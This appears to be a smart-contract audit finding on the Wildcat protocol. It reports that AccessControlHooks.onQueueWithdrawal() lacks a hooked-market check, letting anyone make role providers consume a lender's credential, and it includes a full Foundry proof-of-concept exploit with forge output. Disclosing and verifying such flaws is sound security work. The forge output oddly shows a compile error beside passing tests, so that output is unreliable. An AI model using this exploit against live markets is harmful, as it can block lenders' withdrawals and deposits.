# AccessControlHooks onQueueWithdrawal() does not check if market is hooked which could lead to unexpected errors such as temporary DoS

# Lines of code

https://github.com/code-423n4/2024-08-wildcat/blob/main/src/access/AccessControlHooks.sol#L812


# Vulnerability details


## Impact
The `onQueueWithdrawal()` function does not check if the caller is a hooked market, meaning anyone can call the function and attempt to verify credentials on a lender. This results in calls to registered pull providers with arbitrary hookData, which could lead to potential issues such as abuse of credentials that are valid for a short term, e.g. 1 block.

## Proof of Concept
The `onQueueWithdrawal()` function does not check if the msg.sender is a hooked market, which is standart in virtually all other hooks:

https://github.com/code-423n4/2024-08-wildcat/blob/main/src/access/AccessControlHooks.sol#L812
```js
  /**
   * @dev Called when a lender attempts to queue a withdrawal.
   *      Passes the check if the lender has previously deposited or received
   *      market tokens while having the ability to deposit, or currently has a
   *      valid credential from an approved role provider.
   */
  function onQueueWithdrawal(
    address lender,
    uint32 /* expiry */,
    uint /* scaledAmount */,
    MarketState calldata /* state */,
    bytes calldata hooksData
  ) external override {
    LenderStatus memory status = _lenderStatus[lender];
    if (
      !isKnownLenderOnMarket[lender,msg.sender] && !_tryValidateAccess(status, lender, hooksData)
    ) {
      revert NotApprovedLender();
    }
  }
```

If the caller is not a hooked market, the statement `!isKnownLenderOnMarket[lender,msg.sender]`, will return true, because the lender will be unknown. As a result the `_tryValidateAccess()` function will be executed for any `lender` and any `hooksData` passed. The call to [`_tryValidateAccess()`](https://github.com/code-423n4/2024-08-wildcat/blob/main/src/access/AccessControlHooks.sol#L698) will forward the call to [`_tryValidateAccessInner()`](https://github.com/code-423n4/2024-08-wildcat/blob/main/src/access/AccessControlHooks.sol#L654). Choosing a lender of arbitrary address, say `address(1)` will cause the function to attempt to retrieve the credential via the call to [_handleHooksData()](https://github.com/code-423n4/2024-08-wildcat/blob/main/src/access/AccessControlHooks.sol#L670), since the lender will have no previous provider or credentials.

As a result, the _handleHooksData function will forward the call to the encoded provider in the hooksData and will forward the extra hooks data as well, say merkle proof, or any arbitrary malicios data.

https://github.com/code-423n4/2024-08-wildcat/blob/main/src/access/AccessControlHooks.sol#L617
```js
  function _handleHooksData(
    LenderStatus memory status,
    address accountAddress,
    bytes calldata hooksData
  ) internal returns (bool validCredential) {
    // Check if the hooks data only contains a provider address
    if (hooksData.length == 20) {
      // If the data contains only an address, attempt to query a credential from that provider
      // if it exists and is a pull provider.
      address providerAddress = _readAddress(hooksData);
      RoleProvider provider = _roleProviders[providerAddress];
      if (!provider.isNull() && provider.isPullProvider()) {
        return _tryGetCredential(status, provider, accountAddress);
      }
    } else if (hooksData.length > 20) {
      // If the data contains both an address and additional bytes, attempt to
      // validate a credential from that provider
      return _tryValidateCredential(status, accountAddress, hooksData);
    }
  }
```

The function call will be executed in [tryValidateCredential()](https://github.com/code-423n4/2024-08-wildcat/blob/main/src/access/AccessControlHooks.sol#L525), where the extra hookData will be forwarded. As described in the function comments, it will execute a call to `provider.(address account, bytes calldata data)`.

This means that anyone can call the function and pass arbitrary calldata. This can lead to serios vulnerabilities as the calldata is passed to the provider. 

Consider the following scenario:

- The pull provider is implemented to provide a short-term(say one block) approval timestamp.
- A user of the protocol provides a merkle-proof which would grant the one-time approval to withdraw in a transaction.
- A malicios miner frontruns the transaction submitting the same proof, but does not include the honest transaction in the mined block. Instead it is left for the next block.
- In the next block, the credential is no longer valid and as a result the honest user has their transaction revert.
- The miner does this continuosly essentially DoSing the entire market that uses this provider until it is removed and a new one added.

By following this scenario, a malicios user can essentially DoS a specific type pull provider.

Depending on implemenation of the pull provider, this can lead to other issues, as the malicios user can supply any arbitrary hookData in the function call.

## Recommended Mitigation Steps
Require the caller to be a registered hooked market, same as [onQueueWithdrawal()](https://github.com/code-423n4/2024-08-wildcat/blob/main/src/access/FixedTermLoanHooks.sol#L848) in FixedTermloanHooks



## Assessed type

DoS

## Proof of concept (executed against the audited commit)

Test file `test/repair/Poc11.t.sol`, run with `forge test --match-path test/repair/Poc11.t.sol -vv` against the unmodified audited code (real `HooksFactory`, `WildcatMarket` and `AccessControlHooks` from the repo's `BaseMarketTest`). The test uses an illustrative stateful role provider (`OneShotVoucherProvider`: issues a one-time voucher per account, `validateCredential` consumes it and stamps the credential with the validation time), registered with a 12-second TTL. The provider is the test's own; the contracts under audit are unmodified.

What the tests show:
- `test_directCall_consumesVoucherAndBlocksDelayedWithdrawal`: an arbitrary EOA with no market tokens calls `hooks.onQueueWithdrawal(carol, ..., provider ++ voucher)` directly. The call succeeds, the provider's state changes (voucher consumed), and when carol's own `queueWithdrawal` is included 30 seconds later it reverts with `NotApprovedLender`. `test_control_honestDelayedWithdrawalSucceeds` shows the identical delayed transaction succeeds without the attacker call.
- Limit of the impact: `test_directCall_sameBlockFrontRunIsHarmless` shows a plain same-block front-run does not hurt carol, because the credential it caches is still valid. Harm requires carol's transaction to land after the cached credential's TTL (the delay/censorship step in the report), and a provider that is stateful with a short TTL.
- `test_viaMarketQueueWithdrawal_cannotTargetOtherAccount`: through the market's `queueWithdrawal` the attacker can only validate their own account; carol's voucher is untouched.
- `test_viaMarketTransfer_consumesVoucherButMakesRecipientKnownLender`: `onTransfer` also validates the recipient with caller-supplied data, so an attacker holding dust can consume carol's voucher via the market. However that path marks carol a known lender, so her later withdrawal succeeds (no harm).
- `test_knownLender_onlyReachableByDirectCall`: for a lender already known on the market, the market paths skip validation (voucher untouched), but the direct call evaluates `isKnownLenderOnMarket[lender][msg.sender]` with `msg.sender = attacker`, consumes the voucher, and the lender's delayed deposit reverts with `NotApprovedLender`.

### Test code

```solidity
// SPDX-License-Identifier: Apache-2.0
pragma solidity >=0.8.20;

import '../BaseMarketTest.sol';
import 'src/access/IRoleProvider.sol';

/// Illustrative stateful provider: the credential service issues a one-time voucher per account,
/// and `validateCredential` consumes it and stamps the credential with the validation time.
contract OneShotVoucherProvider is IRoleProvider {
  mapping(address => mapping(bytes32 => bool)) public issued;
  mapping(address => mapping(bytes32 => bool)) public consumed;

  function issue(address account, bytes32 voucher) external {
    issued[account][voucher] = true;
  }

  function isPullProvider() external pure override returns (bool) {
    return false;
  }

  function getCredential(address) external pure override returns (uint32) {
    return 0;
  }

  function validateCredential(address account, bytes calldata data) external override returns (uint32) {
    bytes32 voucher = abi.decode(data, (bytes32));
    if (!issued[account][voucher]) return 0;
    issued[account][voucher] = false;
    consumed[account][voucher] = true;
    return uint32(block.timestamp);
  }
}

contract Poc11Test is BaseMarketTest {
  uint32 internal constant TTL = 12; // one block
  uint256 internal constant DELAY = 30; // honest transaction lands after the credential TTL

  OneShotVoucherProvider internal provider;
  address internal carol = address(0xca401);
  address internal attacker = address(0xbad);
  bytes32 internal voucher = keccak256('carol-voucher');

  function setUp() public override {
    super.setUp();
    provider = new OneShotVoucherProvider();
    vm.prank(borrower);
    hooks.addRoleProvider(address(provider), TTL);

    // carol receives market tokens from alice. Transfers do not require access in this market,
    // so carol holds tokens but is not a known lender and has no credential.
    vm.prank(alice);
    market.depositUpTo(10e18);
    vm.prank(alice);
    market.transfer(carol, 1e18);

    assertEq(market.balanceOf(carol) > 0, true, 'carol holds market tokens');
    assertFalse(hooks.isKnownLenderOnMarket(carol, address(market)), 'carol not a known lender');
    assertEq(hooks.getLenderStatus(carol).lastApprovalTimestamp, 0, 'carol has no credential');

    provider.issue(carol, voucher);
  }

  function _hooksData(bytes32 v) internal view returns (bytes memory) {
    return abi.encodePacked(address(provider), v);
  }

  function _marketQueueWithdrawal(address from, uint256 amount, bytes memory hooksData) internal returns (bool ok, bytes memory ret) {
    vm.prank(from);
    (ok, ret) = address(market).call(
      abi.encodePacked(abi.encodeWithSelector(market.queueWithdrawal.selector, amount), hooksData)
    );
  }

  function _directHookCall(address caller, address lender, bytes memory hooksData) internal {
    MarketState memory state = market.currentState();
    vm.prank(caller);
    hooks.onQueueWithdrawal(lender, 0, 0, state, hooksData);
  }

  // Control: with no attacker, the same delayed transaction succeeds.
  function test_control_honestDelayedWithdrawalSucceeds() external {
    vm.warp(block.timestamp + DELAY);
    (bool ok, ) = _marketQueueWithdrawal(carol, 1e18, _hooksData(voucher));
    assertTrue(ok, 'honest queueWithdrawal succeeds when voucher is intact');
    assertTrue(provider.consumed(carol, voucher));
  }

  // Attack: anyone calls the hooks contract directly with carol as `lender`.
  function test_directCall_consumesVoucherAndBlocksDelayedWithdrawal() external {
    // Attacker is an arbitrary EOA with no market tokens and no relationship to carol.
    assertEq(market.balanceOf(attacker), 0);

    _directHookCall(attacker, carol, _hooksData(voucher));

    assertTrue(provider.consumed(carol, voucher), 'provider state changed: voucher consumed');
    assertEq(hooks.getLenderStatus(carol).lastApprovalTimestamp, block.timestamp, 'credential cached for carol');

    // carol's own transaction is included only after the cached credential has expired.
    vm.warp(block.timestamp + DELAY);
    (bool ok, bytes memory ret) = _marketQueueWithdrawal(carol, 1e18, _hooksData(voucher));
    assertFalse(ok, 'carol queueWithdrawal reverts');
    assertEq(bytes4(ret), AccessControlHooks.NotApprovedLender.selector, 'NotApprovedLender');
  }

  // Limit of the claim: a same-block front-run is harmless because the credential it caches is still valid.
  function test_directCall_sameBlockFrontRunIsHarmless() external {
    _directHookCall(attacker, carol, _hooksData(voucher));
    (bool ok, ) = _marketQueueWithdrawal(carol, 1e18, _hooksData(voucher));
    assertTrue(ok, 'carol succeeds when included in the same block');
  }

  // Through the market's queueWithdrawal the attacker can only validate their own account.
  function test_viaMarketQueueWithdrawal_cannotTargetOtherAccount() external {
    vm.prank(alice);
    market.transfer(attacker, 1e18);
    (bool ok, bytes memory ret) = _marketQueueWithdrawal(attacker, 1e18, _hooksData(voucher));
    assertFalse(ok);
    assertEq(bytes4(ret), AccessControlHooks.NotApprovedLender.selector);
    assertFalse(provider.consumed(carol, voucher), 'carol voucher untouched');
    assertTrue(provider.issued(carol, voucher), 'carol voucher still valid');
  }

  // onTransfer validates the *recipient* with caller-supplied data, so an attacker holding dust of
  // market tokens can also make the provider consume carol's voucher through a hooked market. The
  // market path differs: a valid credential marks the recipient a known lender (canSetKnownLender),
  // which permanently satisfies onQueueWithdrawal, so the delayed withdrawal is not blocked.
  function test_viaMarketTransfer_consumesVoucherButMakesRecipientKnownLender() external {
    vm.prank(alice);
    market.transfer(attacker, 1000);

    vm.prank(attacker);
    (bool ok, ) = address(market).call(
      abi.encodePacked(abi.encodeWithSelector(market.transfer.selector, carol, 1), _hooksData(voucher))
    );
    assertTrue(ok, 'transfer with extra data succeeds');
    assertTrue(provider.consumed(carol, voucher), 'voucher consumed through the market path');
    assertTrue(hooks.isKnownLenderOnMarket(carol, address(market)), 'carol marked known lender');

    vm.warp(block.timestamp + DELAY);
    (bool ok2, ) = _marketQueueWithdrawal(carol, 1e18, '');
    assertTrue(ok2, 'carol withdraws without any credential: no harm via this path');
  }

  // Where the missing check is the enabler: a known lender is shielded on the market paths
  // (onTransfer and onQueueWithdrawal both skip validation for known lenders), but the direct call
  // evaluates `isKnownLenderOnMarket[lender][msg.sender]` with msg.sender = attacker, so the shield is bypassed.
  function test_knownLender_onlyReachableByDirectCall() external {
    address dave = address(0xda4e);
    bytes32 v1 = keccak256('dave-v1');
    bytes32 v2 = keccak256('dave-v2');
    asset.mint(dave, 10e18);
    vm.prank(dave);
    asset.approve(address(market), type(uint256).max);

    // dave's first deposit presents voucher v1 and becomes a known lender on this market.
    provider.issue(dave, v1);
    vm.prank(dave);
    (bool ok, ) = address(market).call(
      abi.encodePacked(abi.encodeWithSelector(market.depositUpTo.selector, 1e18), _hooksData(v1))
    );
    assertTrue(ok, 'first deposit with voucher succeeds');
    assertTrue(hooks.isKnownLenderOnMarket(dave, address(market)), 'dave is now a known lender');

    // Later dave is issued a fresh voucher for a second deposit (deposits always re-check access here).
    vm.warp(block.timestamp + DELAY);
    provider.issue(dave, v2);

    // Market path: an attacker transfer to dave skips validation, voucher untouched.
    vm.prank(alice);
    market.transfer(attacker, 1000);
    vm.prank(attacker);
    (bool okT, ) = address(market).call(
      abi.encodePacked(abi.encodeWithSelector(market.transfer.selector, dave, 1), _hooksData(v2))
    );
    assertTrue(okT);
    assertFalse(provider.consumed(dave, v2), 'market path cannot touch a known lender voucher');

    // Direct path: consumes it.
    _directHookCall(attacker, dave, _hooksData(v2));
    assertTrue(provider.consumed(dave, v2), 'direct call consumes known lender voucher');

    // dave's delayed deposit now fails.
    vm.warp(block.timestamp + DELAY);
    vm.prank(dave);
    (bool ok2, bytes memory ret) = address(market).call(
      abi.encodePacked(abi.encodeWithSelector(market.depositUpTo.selector, 1e18), _hooksData(v2))
    );
    assertFalse(ok2, 'dave deposit reverts');
    assertEq(bytes4(ret), AccessControlHooks.NotApprovedLender.selector);
  }
}
```

### forge output

```
Warning: Found unknown `fuzz_runs` config for profile `coverage` defined in foundry.toml.
No files changed, compilation skipped
error: unresolved symbol `locals`
   --> src/spherex/SphereXProtectedRegisteredBase.sol:153:39
    |
153 |   ) internal returnsIfNotActivatedPre(locals) returns (ModifierLocals memory locals) {
    |                                       ^^^^^^


Ran 6 tests for test/repair/Poc11.t.sol:Poc11Test
[PASS] test_control_honestDelayedWithdrawalSucceeds() (gas: 245392)
Logs:
  computeCreateAddress is deprecated. Please use vm.computeCreateAddress instead.

[PASS] test_directCall_consumesVoucherAndBlocksDelayedWithdrawal() (gas: 177257)
Logs:
  computeCreateAddress is deprecated. Please use vm.computeCreateAddress instead.

[PASS] test_directCall_sameBlockFrontRunIsHarmless() (gas: 259084)
Logs:
  computeCreateAddress is deprecated. Please use vm.computeCreateAddress instead.

[PASS] test_knownLender_onlyReachableByDirectCall() (gas: 486660)
Logs:
  computeCreateAddress is deprecated. Please use vm.computeCreateAddress instead.

[PASS] test_viaMarketQueueWithdrawal_cannotTargetOtherAccount() (gas: 158910)
Logs:
  computeCreateAddress is deprecated. Please use vm.computeCreateAddress instead.

[PASS] test_viaMarketTransfer_consumesVoucherButMakesRecipientKnownLender() (gas: 392421)
Logs:
  computeCreateAddress is deprecated. Please use vm.computeCreateAddress instead.

Suite result: ok. 6 passed; 0 failed; 0 skipped; finished in 6.28ms (4.06ms CPU time)

Ran 1 test suite in 137.67ms (6.28ms CPU time): 6 tests passed, 0 failed, 0 skipped (6 total tests)
```

## Response to the pre-screen checklist

1. Concrete harmful effect from a direct call: `test_directCall_consumesVoucherAndBlocksDelayedWithdrawal` shows a direct external call reaching the provider with attacker-supplied data, changing provider state (voucher consumed), and the lender's subsequent `queueWithdrawal` reverting with `NotApprovedLender`, while the control test shows it succeeds otherwise. The effect is conditional: it needs a stateful provider whose credential TTL is shorter than the delay imposed on the lender's transaction (`test_directCall_sameBlockFrontRunIsHarmless` shows no harm without that delay).
2. Dependence on the missing hooked-market check: partly. Via the market's `queueWithdrawal` the attacker cannot validate another account (`test_viaMarketQueueWithdrawal_cannotTargetOtherAccount`), and for a lender who is already a known lender the market's `onTransfer` path skips validation while the direct call does not (`test_knownLender_onlyReachableByDirectCall`), so the missing check is the enabler for that case. For a lender who is not yet known, the market's `onTransfer` path can also consume the voucher, but it marks the recipient a known lender and so does not block them (`test_viaMarketTransfer_consumesVoucherButMakesRecipientKnownLender`). The test does not show that the missing check is the only way to reach provider state with arbitrary data.
